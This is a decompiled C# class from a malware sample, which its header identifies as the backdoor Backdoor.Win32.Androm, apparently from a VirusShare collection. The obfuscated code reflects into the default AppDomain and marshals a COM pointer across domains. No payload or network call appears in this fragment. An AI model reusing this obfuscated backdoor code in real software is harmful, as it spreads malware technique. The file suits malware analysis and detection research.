// Decompiled with JetBrains decompiler
// Type: õ.í
// Assembly: WindowsApplication1, Version=8.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: ED46BCEB-CED4-40B1-868F-E45B7BFC7B90
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Backdoor.Win32.Androm.jxcj-dccd6425a1e27414583c856fa94c7fa1e2863e399e4d60d7d6068b04bbe13c91.exe

using \u0083õ;
using \u0083û;
using System;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;

namespace \u0083õ
{
  [Serializable]
  internal class \u0083í
  {
    private IntPtr \u0082Ñ;
    private int \u0082Ï;
    [NonSerialized]
    private AppDomain \u0082Ì;

    public \u0083í(AppDomain domain, int domainId)
    {
      this.\u0082Ï = domainId;
      this.\u0082Ì = domain;
      this.\u0082Ñ = IntPtr.Zero;
    }

    public void \u0082í()
    {
      if (this.\u0082Ì == null)
        return;
      try
      {
        for (int index = 0; index < 10; ++index)
        {
          try
          {
            string friendlyName = this.\u0082Ì.FriendlyName;
            Thread.Sleep(50);
          }
          catch (AppDomainUnloadedException ex)
          {
            break;
          }
        }
      }
      finally
      {
        \u0083ú.\u0082\u0085(this.\u0082Ï);
      }
    }

    public static AppDomain \u0081Ù()
    {
      MethodInfo method = typeof (AppDomain).GetMethod("GetDefaultDomain", BindingFlags.Static | BindingFlags.NonPublic);
      return method == (MethodInfo) null ? (AppDomain) null : method.Invoke((object) null, (object[]) null) as AppDomain;
    }

    public void \u0081Ô()
    {
      Marshal.GetObjectForIUnknown(this.\u0082Ñ);
      Marshal.Release(this.\u0082Ñ);
      this.\u0082Ñ = IntPtr.Zero;
      new Thread(new ThreadStart(this.\u0082í)).Start();
    }

    public void \u0082Ú(object _param1, EventArgs _param2)
    {
      AppDomain appDomain = \u0083í.\u0081Ù();
      if (appDomain == null)
        return;
      CrossAppDomainDelegate callBackDelegate = new CrossAppDomainDelegate(this.\u0081Ô);
      this.\u0082Ñ = Marshal.GetIUnknownForObject((object) this.\u0082Ì);
      this.\u0082Ì = (AppDomain) null;
      appDomain.DoCallBack(callBackDelegate);
    }
  }
}
